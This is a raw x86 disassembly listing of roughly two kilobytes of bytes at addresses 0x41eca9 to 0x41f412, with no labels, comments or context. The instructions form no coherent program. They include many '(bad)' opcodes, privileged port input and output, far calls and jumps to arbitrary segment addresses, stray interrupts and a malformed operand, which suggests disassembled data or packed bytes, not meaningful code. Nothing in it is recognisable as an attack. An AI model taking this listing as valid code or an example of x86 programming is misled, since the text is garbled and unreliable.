  41eca9:	push   ecx
  41ecaa:	or     al,0xe9
  41ecac:	test   DWORD PTR [ebx+0x11970103],0x6af8ef64
  41ecb6:	stc    
  41ecb7:	dec    edx
  41ecb8:	out    dx,eax
  41ecb9:	(bad)  
  41ecba:	cmp    DWORD PTR ds:0xeccc3786,ebx
  41ecc0:	aas    
  41ecc1:	xchg   esp,eax
  41ecc2:	pop    edx
  41ecc3:	inc    esi
  41ecc4:	mov    al,0x8e
  41ecc6:	pushf  
  41ecc7:	xchg   ebx,eax
  41ecc8:	sub    al,0x66
  41ecca:	test   BYTE PTR [edi+0x15514c67],dh
  41ecd0:	jmp    0x81c59454
  41ecd5:	mov    eax,ds:0x877eccaa
  41ecda:	dec    esi
  41ecdb:	cmp    ebp,DWORD PTR [ebp+0x74]
  41ecde:	pop    ebp
  41ecdf:	(bad)  
  41ece0:	fiadd  WORD PTR [ecx-0x60]
  41ece3:	lahf   
  41ece4:	xlat   BYTE PTR ds:[ebx]
  41ece5:	fst    QWORD PTR [ecx+0x6ebd35d4]
  41eceb:	cmp    cl,BYTE PTR [esi+ecx*8+0x1b56097e]
  41ecf2:	pop    ds
  41ecf3:	sub    al,0xfd
  41ecf5:	push   eax
  41ecf6:	hlt    
  41ecf7:	not    DWORD PTR [edx-0x19fea1b2]
  41ecfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecfe:	js     0x41ecea
  41ed00:	jecxz  0x41ecc4
  41ed02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed03:	dec    esi
  41ed04:	mov    esp,0xfef31c6a
  41ed09:	and    al,0x7b
  41ed0b:	cmp    edi,DWORD PTR [edi]
  41ed0d:	mov    ds:0xe140aa13,al
  41ed12:	into   
  41ed13:	data16 xchg bp,ax
  41ed16:	pop    ebx
  41ed17:	lahf   
  41ed18:	data16 mov ch,0xb2
  41ed1b:	and    BYTE PTR [esi+0x65f27c97],cl
  41ed21:	call   0xc8e:0x9efffa82
  41ed28:	idiv   BYTE PTR [ecx]
  41ed2a:	repz cmp ecx,DWORD PTR [edx]
  41ed2d:	call   0xfe4a:0x837182f5
  41ed34:	xor    dl,BYTE PTR [ebx+0x5488e9d6]
  41ed3a:	out    dx,eax
  41ed3b:	pop    es
  41ed3c:	mov    edi,0xaea21df
  41ed41:	push   0x69
  41ed43:	sub    DWORD PTR [edi],ebp
  41ed45:	add    eax,0x88fe759f
  41ed4a:	sub    eax,0x6d152a1a
  41ed4f:	inc    eax
  41ed50:	pop    ebp
  41ed51:	cmp    DWORD PTR [eax],ebx
  41ed53:	stos   BYTE PTR es:[edi],al
  41ed54:	ja     0x41eda7
  41ed56:	push   0xffffffec
  41ed58:	sar    BYTE PTR [edi-0x55],0x5
  41ed5c:	test   eax,0xc4dd2e8d
  41ed61:	lds    eax,FWORD PTR [eax]
  41ed63:	int3   
  41ed64:	and    dl,BYTE PTR [edx+edi*4]
  41ed67:	out    0x43,eax
  41ed69:	test   BYTE PTR ds:0xf246a29b,ch
  41ed6f:	cmp    eax,0x22aad233
  41ed74:	sub    al,0x27
  41ed76:	ret    
  41ed77:	mov    BYTE PTR [ecx],cl
  41ed79:	lds    eax,FWORD PTR ds:0x23c980df
  41ed7f:	pop    ecx
  41ed80:	(bad)  
  41ed81:	lods   eax,DWORD PTR fs:[esi]
  41ed83:	es sub eax,0x4103274b
  41ed89:	popf   
  41ed8a:	inc    ecx
  41ed8b:	xlat   BYTE PTR ds:[ebx]
  41ed8c:	fst    DWORD PTR [ecx-0x52]
  41ed8f:	test   DWORD PTR [ebp-0x64],ebp
  41ed92:	adc    BYTE PTR [edi],bh
  41ed94:	push   0xffffffcb
  41ed96:	cmp    al,dh
  41ed98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed99:	or     eax,DWORD PTR [ebp+0x1f42d73e]
  41ed9f:	mov    ch,0xa
  41eda1:	popf   
  41eda2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eda3:	mov    BYTE PTR [esi],bl
  41eda5:	jmp    0x41ee0c
  41eda7:	ret    0x3425
  41edaa:	repnz adc al,ch
  41edad:	(bad)  
  41edae:	mov    ds:0x47f9a030,eax
  41edb3:	pusha  
  41edb4:	fcmovu st,st(5)
  41edb6:	dec    esi
  41edb7:	repz xchg edx,eax
  41edb9:	cs mov edx,0xca8913bf
  41edbf:	int    0xe7
  41edc1:	inc    al
  41edc3:	fld    TBYTE PTR [edx+ebp*2+0x469f24e1]
  41edca:	std    
  41edcb:	jmp    0x39687ee5
  41edd0:	and    bh,al
  41edd2:	add    BYTE PTR [edx-0x54],0x8d
  41edd6:	inc    ebx
  41edd7:	inc    edi
  41edd8:	push   ebp
  41edd9:	jns    0x41ed81
  41eddb:	xchg   ebp,eax
  41eddc:	jp     0x41ed95
  41edde:	nop
  41eddf:	aaa    
  41ede0:	(bad)  
  41ede1:	imul   edi,ecx,0xec4ea3a2
  41ede7:	pop    ds
  41ede8:	xchg   esi,eax
  41ede9:	jecxz  0x41ee17
  41edeb:	es stos DWORD PTR es:[edi],eax
  41eded:	sbb    eax,0xafe1abea
  41edf2:	in     al,0xe7
  41edf4:	cdq    
  41edf5:	jge    0x41ee50
  41edf7:	or     ah,BYTE PTR [edx+0x6]
  41edfa:	bound  ecx,QWORD PTR [ebx-0x5d]
  41edfd:	outs   dx,BYTE PTR ds:[esi]
  41edfe:	push   cs
  41edff:	add    ah,bl
  41ee01:	push   ecx
  41ee02:	adc    al,0xc0
  41ee04:	cmp    edx,DWORD PTR [edi-0x71]
  41ee07:	adc    DWORD PTR [esi],ecx
  41ee09:	(bad)  
  41ee0b:	cmp    eax,0x7a6772bd
  41ee10:	sbb    ah,BYTE PTR [eax+0x56e74ab5]
  41ee16:	daa    
  41ee17:	(bad)  [ebx+0x179fe1b9]
  41ee1d:	repnz (bad) 
  41ee1f:	data16 add al,0xfb
  41ee22:	and    dh,BYTE PTR [ebp+0x7c]
  41ee25:	mov    cl,0x64
  41ee27:	retf   
  41ee28:	test   al,0x61
  41ee2a:	and    eax,0x3b0415a5
  41ee2f:	pop    ds
  41ee30:	fstp   QWORD PTR [edx-0x504869f]
  41ee36:	test   al,0x59
  41ee38:	leave  
  41ee39:	add    eax,0x2d4d2c6a
  41ee3e:	cs xor al,0x2
  41ee41:	aam    0xb4
  41ee43:	out    0x85,eax
  41ee45:	add    BYTE PTR [eax],bh
  41ee47:	repz int3 
  41ee49:	ror    BYTE PTR [ebx-0x23],1
  41ee4c:	imul   ecx,DWORD PTR [eax],0xffffff8b
  41ee4f:	les    ebx,FWORD PTR [ebp-0x55]
  41ee52:	push   eax
  41ee53:	neg    DWORD PTR [esi+0x384781f2]
  41ee59:	jns    0x41eead
  41ee5b:	dec    esi
  41ee5c:	out    dx,eax
  41ee5d:	sahf   
  41ee5e:	jmp    0x41ee93
  41ee60:	jge    0x41ee18
  41ee62:	ds scas eax,DWORD PTR es:[edi]
  41ee64:	pop    edx
  41ee65:	inc    ebp
  41ee66:	mov    ds:0xa8a3377,eax
  41ee6b:	fild   WORD PTR [esi+0x1]
  41ee6e:	jl     0x41ee02
  41ee70:	cmp    al,0x38
  41ee72:	add    BYTE PTR [edx+0x3bccef36],ah
  41ee78:	mov    ds:0x8c120ee1,eax
  41ee7d:	popf   
  41ee7e:	pop    ds
  41ee7f:	sahf   
  41ee80:	test   BYTE PTR [eax+ebp*1],0xfb
  41ee84:	pop    ecx
  41ee85:	xor    BYTE PTR [ebx+0x23],cl
  41ee88:	cli    
  41ee89:	pop    edx
  41ee8a:	int    0xd6
  41ee8c:	in     eax,dx
  41ee8d:	ffreep st(4)
  41ee8f:	mov    al,ds:0xf8d78ab9
  41ee94:	inc    eax
  41ee95:	daa    
  41ee96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee97:	mov    ch,0x61
  41ee99:	shl    BYTE PTR [ecx-0x30],0x82
  41ee9d:	mov    eax,0xd73c7326
  41eea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eea3:	(bad)  
  41eea4:	mov    ds:0x483e582a,eax
  41eea9:	out    dx,eax
  41eeaa:	cld    
  41eeab:	call   0xadef:0xaa91fb7d
  41eeb2:	and    BYTE PTR [ebp+edi*1+0x7c09deb3],ch
  41eeb9:	fcmovnu st,st(5)
  41eebb:	cdq    
  41eebc:	(bad)  
  41eebd:	outs   dx,DWORD PTR ds:[esi]
  41eebe:	inc    eax
  41eebf:	fistp  WORD PTR [edi-0x4415643e]
  41eec5:	aam    0x76
  41eec7:	out    dx,eax
  41eec8:	sbb    BYTE PTR [ebx],dh
  41eeca:	add    BYTE PTR [edx],dl
  41eecc:	lods   al,BYTE PTR ds:[esi]
  41eecd:	jae    0x41ef1b
  41eecf:	lock pop edx
  41eed1:	int3   
  41eed2:	into   
  41eed3:	test   BYTE PTR [edi-0x62],ch
  41eed6:	jmp    0xcca:0xdeeb3b16
  41eedd:	adc    DWORD PTR [edi],edx
  41eedf:	cs dec eax
  41eee1:	clc    
  41eee2:	push   es
  41eee3:	lds    ecx,FWORD PTR [esp+ebp*4-0xb3d2837]
  41eeea:	xchg   edx,eax
  41eeeb:	pop    edi
  41eeec:	push   ebx
  41eeed:	cmp    ch,BYTE PTR [esi-0x44]
  41eef0:	xor    edx,esp
  41eef2:	or     al,0xc
  41eef4:	xor    ebp,0x3a3869ca
  41eefa:	and    ebp,DWORD PTR [ebx+0xa]
  41eefd:	push   0xd2f56f20
  41ef02:	and    BYTE PTR [esi],dh
  41ef04:	xor    ebx,DWORD PTR [esi+0xfe16982]
  41ef0a:	mov    edx,0x1688e8e8
  41ef0f:	std    
  41ef10:	pop    ebx
  41ef11:	iret   
  41ef12:	and    DWORD PTR [esi],esi
  41ef14:	add    BYTE PTR [ecx-0x279988e9],cl
  41ef1a:	mov    WORD PTR [eax],ds
  41ef1c:	ss cs pop eax
  41ef1f:	ret    
  41ef20:	or     DWORD PTR [edi],ebx
  41ef22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef23:	mov    dh,0xab
  41ef25:	ret    
  41ef26:	into   
  41ef27:	retf   
  41ef28:	inc    edi
  41ef29:	jb     0x41eeee
  41ef2b:	sbb    al,bh
  41ef2d:	popf   
  41ef2e:	push   cs
  41ef2f:	jno    0x41eee3
  41ef31:	adc    DWORD PTR [ebp+0x5d],esi
  41ef34:	ret    
  41ef35:	mov    dh,0x3e
  41ef37:	ss sub DWORD PTR ds:[ebx-0x3b],0xfa10074e
  41ef40:	call   0x1a68:0xeceb7e77
  41ef47:	call   0x399e5a58
  41ef4c:	ret    0x2215
  41ef4f:	mov    cl,0x8c
  41ef51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef52:	mov    DWORD PTR [ecx+0x7d],ecx
  41ef55:	mov    ds:0x1e877d99,al
  41ef5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef5b:	xchg   esi,eax
  41ef5c:	shl    DWORD PTR [edx+0x45],1
  41ef5f:	pop    ss
  41ef60:	stos   DWORD PTR es:[edi],eax
  41ef61:	cmp    DWORD PTR [ecx+0x65],0xc5fcae2
  41ef68:	cmp    al,0x51
  41ef6a:	and    al,0x6
  41ef6c:	pop    esi
  41ef6d:	adc    DWORD PTR [edi],0x8aa4d566
  41ef73:	sbb    dl,bh
  41ef75:	push   ebp
  41ef76:	pusha  
  41ef77:	mov    ch,0x19
  41ef79:	sahf   
  41ef7a:	lahf   
  41ef7b:	xchg   edx,eax
  41ef7c:	movnti DWORD PTR [ebx+0x58],ecx
  41ef80:	inc    ebx
  41ef81:	mov    al,0x4b
  41ef83:	jg     0x41f000
  41ef85:	rol    DWORD PTR [ebx+ebx*2+0x2a6f973a],1
  41ef8c:	stc    
  41ef8d:	adc    eax,0xe4fba558
  41ef92:	or     BYTE PTR [eax],dh
  41ef94:	scas   al,BYTE PTR es:[edi]
  41ef95:	add    al,0xb3
  41ef97:	mov    WORD PTR [ebp+0x59],cs
  41ef9a:	aam    0x2a
  41ef9c:	cwde   
  41ef9d:	cwde   
  41ef9e:	popf   
  41ef9f:	add    eax,0x2fe98e59
  41efa4:	and    eax,0x680bf881
  41efa9:	inc    ecx
  41efaa:	out    dx,al
  41efab:	cdq    
  41efac:	mov    bl,0xa8
  41efae:	mov    ecx,0xb9f7c176
  41efb3:	in     al,dx
  41efb4:	push   cs
  41efb5:	pushf  
  41efb6:	mov    eax,ds:0x55a301d9
  41efbb:	mov    bh,0x92
  41efbd:	(bad)  
  41efbe:	repnz cli 
  41efc0:	and    al,0xf5
  41efc2:	rol    BYTE PTR [edi],1
  41efc4:	ins    DWORD PTR es:[edi],dx
  41efc5:	loop   0x41ef9f
  41efc7:	ds (bad) 
  41efc9:	hlt    
  41efca:	rcl    cl,cl
  41efcc:	cmp    cl,BYTE PTR [ebx]
  41efce:	fnstcw WORD PTR [ecx+0x2f]
  41efd1:	jmp    0xf62c:0x8769565e
  41efd8:	jmp    0x88b54282
  41efdd:	imul   eax,DWORD PTR [ecx-0x2f],0x17
  41efe1:	data16 jg 0x41ef98
  41efe4:	mov    cl,bh
  41efe6:	xor    DWORD PTR [ecx+0x2d92cb0a],0xffffffaf
  41efed:	jnp    0x41efb3
  41efef:	fcomp  DWORD PTR ds:0x529fcfba
  41eff5:	rol    DWORD PTR [ebx],0xfe
  41eff8:	in     al,0x57
  41effa:	sbb    ah,al
  41effc:	jnp    0x41efa1
  41effe:	jg     0x41efe0
  41f000:	mov    bl,0x1c
  41f002:	inc    esi
  41f003:	lock (bad) 
  41f006:	sub    DWORD PTR [ebp+0x10],0x8e9718f0
  41f00d:	inc    edx
  41f00e:	pextrw ecx,(bad),0xc5
  41f010:	mov    ss,WORD PTR [esi]
  41f012:	sbb    edi,esp
  41f014:	jmp    0x70764bed
  41f019:	push   es
  41f01a:	xchg   esp,edi
  41f01c:	cmp    eax,0x774c1990
  41f021:	pop    es
  41f022:	imul   esp,DWORD PTR [esi+0x6c557999],0x74
  41f029:	int    0x89
  41f02b:	ins    BYTE PTR es:[edi],dx
  41f02c:	inc    ebx
  41f02d:	repnz sbb al,0xa0
  41f030:	jmp    0x41f083
  41f032:	aaa    
  41f033:	retf   0xf6de
  41f036:	call   0xf9ee:0x1b15af93
  41f03d:	cmp    bl,BYTE PTR [ebp-0x67b9ad37]
  41f043:	(bad)  [ebp-0x78]
  41f046:	mov    esi,DWORD PTR [ecx]
  41f048:	js     0x41f006
  41f04a:	inc    ebx
  41f04b:	mov    ebp,esi
  41f04d:	xor    esi,esp
  41f04f:	mov    bh,BYTE PTR [ecx+0x2b195777]
  41f055:	jo     0x41effd
  41f057:	leave  
  41f058:	test   al,0x56
  41f05a:	scas   al,BYTE PTR es:[edi]
  41f05b:	push   es
  41f05c:	aam    0x80
  41f05e:	jbe    0x41f06c
  41f060:	push   DWORD PTR [edx]
  41f062:	add    esi,DWORD PTR [ebx+0x55]
  41f065:	xchg   ebp,eax
  41f066:	popa   
  41f067:	adc    esi,DWORD PTR [esi]
  41f069:	and    eax,0x94362a45
  41f06e:	loope  0x41f009
  41f070:	rcr    BYTE PTR [edx-0x71],0x33
  41f074:	jmp    0x41f030
  41f076:	test   BYTE PTR [eax+0x4d],0xec
  41f07a:	stos   DWORD PTR es:[edi],eax
  41f07b:	(bad)  
  41f07d:	pop    ebx
  41f07e:	lods   eax,DWORD PTR ds:[esi]
  41f07f:	pop    esi
  41f080:	(bad)  
  41f081:	or     eax,0xb357977b
  41f086:	out    0x8b,al
  41f088:	add    cl,BYTE PTR ss:[edx-0x6c]
  41f08c:	inc    ecx
  41f08d:	inc    DWORD PTR [edx+0x658cf5bf]
  41f093:	adc    al,0x7f
  41f095:	and    esp,esi
  41f097:	xor    dl,BYTE PTR [esi-0x3e]
  41f09a:	pop    eax
  41f09b:	retf   0x87e0
  41f09e:	inc    ebp
  41f09f:	clc    
  41f0a0:	inc    eax
  41f0a1:	rol    BYTE PTR [ebp+0x6134ba5],cl
  41f0a7:	ja     0x41f0fd
  41f0a9:	pop    ebp
  41f0aa:	adc    DWORD PTR [esi],ebx
  41f0ac:	add    eax,0xe5e38fce
  41f0b1:	ret    
  41f0b2:	pop    ss
  41f0b3:	push   edx
  41f0b4:	add    al,bl
  41f0b6:	inc    edi
  41f0b7:	call   0x79cc:0xb16fe162
  41f0be:	inc    eax
  41f0bf:	push   ebx
  41f0c0:	and    ebx,ebp
  41f0c2:	xor    DWORD PTR [ebp+edx*1+0x5f],edi
  41f0c6:	(bad)  [edx+0x6a]
  41f0c9:	pop    eax
  41f0ca:	call   0x8688:0x3a7e3385
  41f0d1:	adc    al,0xc7
  41f0d3:	mov    bl,0x74
  41f0d5:	fisttp DWORD PTR [edx-0x1830177b]
  41f0db:	(bad)  
  41f0dc:	pushf  
  41f0dd:	cwde   
  41f0de:	pop    ds
  41f0df:	pop    ebp
  41f0e0:	add    ebp,DWORD PTR [eax+0x607ac38b]
  41f0e6:	(bad)  
  41f0e7:	pushf  
  41f0e8:	stos   DWORD PTR es:[edi],eax
  41f0e9:	inc    edi
  41f0ea:	int    0xac
  41f0ec:	outs   dx,DWORD PTR ds:[esi]
  41f0ed:	lds    edi,FWORD PTR [ebx]
  41f0ef:	ins    DWORD PTR es:[edi],dx
  41f0f0:	gs jecxz 0x41f08f
  41f0f3:	(bad)  
  41f0f4:	ror    DWORD PTR [ebp+0x79],1
  41f0f7:	add    al,0x82
  41f0f9:	xor    BYTE PTR [edx],0xbe
  41f0fc:	fst    DWORD PTR [ecx-0x13166d9f]
  41f102:	fcmove st,st(0)
  41f104:	sahf   
  41f105:	pop    edx
  41f106:	out    dx,eax
  41f107:	jp     0x41f17a
  41f109:	jbe    0x41f13e
  41f10b:	ror    DWORD PTR [ebp+0x19c68edc],0xb
  41f112:	pop    eax
  41f113:	loop   0x41f0d6
  41f115:	push   esp
  41f116:	sub    al,0xe7
  41f118:	cdq    
  41f119:	or     BYTE PTR [ecx+esi*8+0x732dfea],dl
  41f120:	aad    0xa0
  41f122:	repz and al,0xcc
  41f125:	fnstcw WORD PTR [edx+0x56]
  41f128:	test   BYTE PTR [ecx],al
  41f12a:	enter  0x4aaf,0x65
  41f12e:	cwde   
  41f12f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f130:	xor    ecx,ebp
  41f132:	jg     0x41f180
  41f134:	add    eax,0x8cbf02af
  41f139:	jmp    0x102fb249
  41f13e:	jg     0x41f17c
  41f140:	adc    DWORD PTR [edi+0x49eac175],0x119e14d2
  41f14a:	pop    esi
  41f14b:	(bad)  [eax-0x71]
  41f14e:	add    bl,BYTE PTR [ecx]
  41f150:	mov    DWORD PTR [esp+eiz*8-0x8594a78],eax
  41f157:	dec    ecx
  41f158:	loop   0x41f1a6
  41f15a:	jle    0x41f138
  41f15c:	jae    0x41f155
  41f15e:	pop    ecx
  41f160:	sahf   
  41f161:	outs   dx,BYTE PTR cs:[esi]
  41f163:	cdq    
  41f164:	xchg   esi,eax
  41f165:	xchg   DWORD PTR [ebx+0x27dee469],ecx
  41f16b:	adc    BYTE PTR [ebx-0x42],dh
  41f16e:	lahf   
  41f16f:	fbld   TBYTE PTR [esi-0x4c]
  41f172:	dec    edx
  41f173:	xchg   ecx,eax
  41f174:	jmp    DWORD PTR [edi]
  41f176:	jmp    0xcf0e:0x37bd8b34
  41f17d:	aad    0x19
  41f17f:	ja     0x41f1b9
  41f181:	mov    BYTE PTR [edi+0x7],ch
  41f184:	xor    eax,DWORD PTR [ebp-0x2e4ec2e]
  41f18a:	into   
  41f18b:	pop    edx
  41f18c:	jp     0x41f133
  41f18e:	jecxz  0x41f20a
  41f190:	mov    cl,0x25
  41f192:	in     eax,0x41
  41f194:	sbb    al,0x3
  41f196:	dec    ecx
  41f197:	loop   0x41f1b5
  41f199:	xchg   ebp,eax
  41f19a:	pop    ecx
  41f19b:	cmp    DWORD PTR fs:[ebx],0xbe69f509
  41f1a2:	int    0x63
  41f1a4:	(bad)  
  41f1a5:	mov    dl,0x3e
  41f1a7:	lock dec edi
  41f1a9:	outs   dx,DWORD PTR ds:[esi]
  41f1aa:	cwde   
  41f1ab:	les    esp,FWORD PTR [edx+0x744af695]
  41f1b1:	push   eax
  41f1b2:	das    
  41f1b3:	outs   dx,DWORD PTR ds:[esi]
  41f1b4:	sbb    BYTE PTR [ebx],al
  41f1b6:	std    
  41f1b7:	sub    al,0x46
  41f1b9:	enter  0x87c4,0x59
  41f1bd:	push   DWORD PTR [ebx]
  41f1bf:	pop    ebp
  41f1c0:	pop    ecx
  41f1c1:	xchg   ebx,eax
  41f1c2:	mov    edi,0x8e427bfd
  41f1c7:	inc    eax
  41f1c8:	add    al,0x8
  41f1ca:	mov    ds:0x84730c0f,al
  41f1cf:	bound  esi,QWORD PTR [esi+0x310b493d]
  41f1d5:	shl    BYTE PTR [esi],1
  41f1d7:	je     0x41f247
  41f1d9:	add    eax,DWORD PTR ds:0x2e3e2772
  41f1df:	bound  ebx,QWORD PTR [eax]
  41f1e1:	pop    ss
  41f1e2:	les    ecx,FWORD PTR [eax+0x2425be5e]
  41f1e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1e9:	push   0x4a
  41f1eb:	shl    DWORD PTR [esi-0x36e4a9f2],1
  41f1f1:	in     eax,0xc5
  41f1f3:	dec    ebx
  41f1f4:	stos   BYTE PTR es:[edi],al
  41f1f5:	adc    ebp,DWORD PTR [ebx]
  41f1f7:	push   edi
  41f1f8:	add    eax,0x10289dd0
  41f1fd:	rol    BYTE PTR [esi],cl
  41f1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f200:	xchg   ebp,eax
  41f201:	cwde   
  41f202:	dec    edi
  41f203:	imul   ecx,eax,0x940a7f4
  41f209:	mov    dh,0xba
  41f20b:	jle    0x41f1cb
  41f20d:	mov    dh,0x3f
  41f20f:	int3   
  41f210:	mov    al,ds:0xbf9ae80d
  41f215:	mov    edx,0x18bc197d
  41f21a:	(bad)
  41f21d:	out    dx,al
  41f21e:	xchg   ebp,eax
  41f21f:	jno    0x41f29e
  41f221:	sub    BYTE PTR [ebp-0x22c102a9],cl
  41f227:	mov    edi,0xaabb103f
  41f22d:	into   
  41f22e:	push   0xffffffe0
  41f230:	xlat   BYTE PTR ds:[ebx]
  41f231:	in     eax,0xfb
  41f233:	mov    edi,0x3198b56e
  41f238:	jno    0x41f1ef
  41f23a:	aam    0xf9
  41f23c:	or     al,0xb7
  41f23e:	call   0xadd835b
  41f243:	std    
  41f244:	in     al,0xa4
  41f246:	lock push eax
  41f248:	inc    ebp
  41f249:	sahf   
  41f24a:	push   0x36d282b2
  41f24f:	ja     0x41f2a8
  41f251:	dec    esp
  41f252:	xchg   ecx,eax
  41f253:	xor    DWORD PTR [ecx-0x71],eax
  41f256:	dec    esp
  41f257:	xchg   ebx,eax
  41f258:	test   DWORD PTR [edi],ebp
  41f25a:	inc    edx
  41f25b:	retf   0xbce2
  41f25e:	imul   eax,DWORD PTR [ebp+0x70],0x8
  41f262:	or     al,0x95
  41f264:	lock mov ch,0x98
  41f267:	retf   0xdca1
  41f26a:	xchg   ebx,eax
  41f26b:	mov    esi,0xf8ea274e
  41f270:	inc    edx
  41f271:	rep outs dx,DWORD PTR ds:[esi]
  41f273:	jno    0x41f293
  41f275:	std    
  41f276:	xchg   ebx,eax
  41f277:	mov    ds,edi
  41f279:	push   ebp
  41f27a:	dec    edx
  41f27b:	(bad)  
  41f27c:	iret   
  41f27d:	cld    
  41f27e:	jg     0x41f2f2
  41f280:	jno    0x41f27f
  41f282:	rcr    BYTE PTR [eax+esi*1-0x14],cl
  41f286:	xor    esi,esi
  41f288:	cmp    al,BYTE PTR [edi+0x2ef480f7]
  41f28e:	mov    ch,0xa5
  41f290:	sti    
  41f291:	pusha  
  41f292:	dec    BYTE PTR [eax]
  41f294:	stos   DWORD PTR es:[edi],eax
  41f295:	or     eax,0xebd0c23a
  41f29a:	shl    DWORD PTR [esi-0x30],cl
  41f29d:	xchg   ax,ax
  41f29f:	out    0x94,eax
  41f2a1:	retf   
  41f2a2:	es sbb eax,0x8bdb214d
  41f2a8:	jb     0x41f26a
  41f2aa:	mov    ds:0xdd0bd48f,eax
  41f2af:	mov    ebp,0x3e02c0d3
  41f2b4:	mov    bp,0x66c4
  41f2b8:	call   0xba61:0xb2a4f2d0
  41f2bf:	inc    ebx
  41f2c0:	ins    DWORD PTR es:[edi],dx
  41f2c1:	inc    eax
  41f2c2:	das    
  41f2c3:	scas   eax,DWORD PTR es:[edi]
  41f2c4:	adc    eax,0xb56ca0a9
  41f2c9:	pop    ebp
  41f2ca:	ret    0xe793
  41f2cd:	sahf   
  41f2ce:	loopne 0x41f26c
  41f2d0:	ror    DWORD PTR [esi+0x34],cl
  41f2d3:	jne    0x41f2a9
  41f2d5:	iret   
  41f2d6:	fdivr  QWORD PTR [ebp+0x574dca8b]
  41f2dc:	mov    ?,WORD PTR [eax]
  41f2de:	lea    ebp,[edi-0x5d]
  41f2e1:	mov    bh,0xed
  41f2e3:	into   
  41f2e4:	cli    
  41f2e5:	sub    ecx,DWORD PTR [edi+0x3f331099]
  41f2eb:	inc    edi
  41f2ec:	ds dec ebp
  41f2ee:	dec    ebx
  41f2ef:	test   al,0x25
  41f2f1:	mov    al,0x97
  41f2f3:	stos   DWORD PTR es:[edi],eax
  41f2f4:	push   ecx
  41f2f5:	clc    
  41f2f6:	sbb    esi,DWORD PTR [ebx-0x49]
  41f2f9:	and    eax,esp
  41f2fb:	xor    BYTE PTR [edi],bl
  41f2fd:	clc    
  41f2fe:	rcr    DWORD PTR [ebx-0x2d],0xde
  41f302:	loope  0x41f2fe
  41f304:	jmp    0x41f28a
  41f306:	outs   dx,DWORD PTR ds:[esi]
  41f307:	xchg   edx,eax
  41f308:	jmp    0x41f37d
  41f30a:	ret    
  41f30b:	dec    ebx
  41f30c:	add    BYTE PTR [edx+0x46],al
  41f30f:	out    dx,al
  41f310:	repz mov fs,esi
  41f313:	inc    ebp
  41f314:	inc    ecx
  41f315:	jae    0x41f2da
  41f317:	pop    edi
  41f318:	add    esi,edx
  41f31a:	jmp    0xdc8bb888
  41f31f:	dec    esi
  41f320:	adc    DWORD PTR [eax],esi
  41f322:	adc    esp,DWORD PTR [esi-0x5e956a62]
  41f328:	pop    esp
  41f329:	mov    ebx,0x5fee847b
  41f32e:	sub    edi,DWORD PTR [edi+ebx*4]
  41f331:	loopne 0x41f3a7
  41f333:	mov    ds:0x1e0dcd,eax
  41f338:	mov    ecx,0xbd49e6f4
  41f33d:	mov    ebx,DWORD PTR [edi]
  41f33f:	dec    ebx
  41f340:	aam    0xd1
  41f342:	mov    DWORD PTR [esi],0xccc28690
  41f348:	dec    edi
  41f349:	add    ah,BYTE PTR [edi]
  41f34b:	imul   ebx,DWORD PTR gs:[eax-0x1e84af4b],0xc7447ec4
  41f356:	dec    eax
  41f357:	push   edx
  41f358:	push   esp
  41f359:	cmp    esi,DWORD PTR [edi-0x23]
  41f35c:	jno    0x41f37f
  41f35e:	out    dx,eax
  41f35f:	mov    ecx,esi
  41f361:	retf   0xc18f
  41f364:	retf   
  41f365:	ret    
  41f366:	push   ebx
  41f367:	xchg   ecx,eax
  41f368:	pop    esi
  41f369:	test   al,0x63
  41f36b:	sub    eax,0x49515cb6
  41f370:	push   0x4987f334
  41f375:	fiadd  WORD PTR [ebp+0x6d2cdac8]
  41f37b:	scas   eax,DWORD PTR es:[edi]
  41f37c:	sub    al,0x9d
  41f37e:	push   es
  41f37f:	fwait
  41f380:	mov    DWORD PTR [eax-0x14804720],edi
  41f386:	adc    eax,0x9d200569
  41f38b:	adc    dh,bl
  41f38d:	aad    0x5e
  41f38f:	div    ah
  41f391:	ror    WORD PTR [ebx-0x7c],cl
  41f395:	rol    DWORD PTR [edx+0x22],cl
  41f398:	sbb    eax,0xcc835379
  41f39d:	mov    esi,0x32d87065
  41f3a2:	test   DWORD PTR [ecx+0x21],0xae931e27
  41f3a9:	mov    edx,0x66247b32
  41f3ae:	test   al,0x8
  41f3b0:	sub    dh,bh
  41f3b2:	std    
  41f3b3:	mov    eax,ds:0xac613f4e
  41f3b8:	cmp    eax,0xcce67e3c
  41f3bd:	(bad)  
  41f3be:	(bad)  
  41f3c0:	and    al,0x60
  41f3c2:	pop    es
  41f3c3:	xor    esp,DWORD PTR [ecx-0x34]
  41f3c6:	xor    dl,BYTE PTR [esi+ecx*1-0x4e]
  41f3ca:	cmovl  eax,DWORD PTR [esi-0x38da1170]
  41f3d1:	iret   
  41f3d2:	dec    eax
  41f3d3:	adc    eax,0xf3da6a16
  41f3d8:	lea    edi,[ecx]
  41f3da:	pop    edx
  41f3db:	outs   dx,BYTE PTR ds:[esi]
  41f3dc:	mov    ecx,0xa0644254
  41f3e1:	in     al,0x7f
  41f3e3:	push   eax
  41f3e4:	xor    eax,0x497c7c53
  41f3e9:	xchg   ch,dh
  41f3eb:	or     cl,BYTE PTR [ecx+ecx*4]
  41f3ee:	jne    0x41f405
  41f3f0:	call   0xc4f00e0
  41f3f5:	clc    
  41f3f6:	mov    bh,0x13
  41f3f8:	sbb    al,0x6b
  41f3fa:	fwait
  41f3fb:	shr    DWORD PTR [eax-0x7a],cl
  41f3fe:	xchg   edi,eax
  41f3ff:	or     al,0xa3
  41f401:	sbb    al,0xc
  41f403:	ret    0x2dce
  41f406:	fisub  WORD PTR [edi]
  41f408:	lods   al,BYTE PTR ds:[esi]
  41f409:	shl    DWORD PTR [ecx+0x55],cl
  41f40c:	lods   eax,DWORD PTR ds:[esi]
  41f40d:	loope  0x41f3c7
  41f40f:	cmc    
  41f410:	sbb    dh,dh
  41f412:	inc    edx
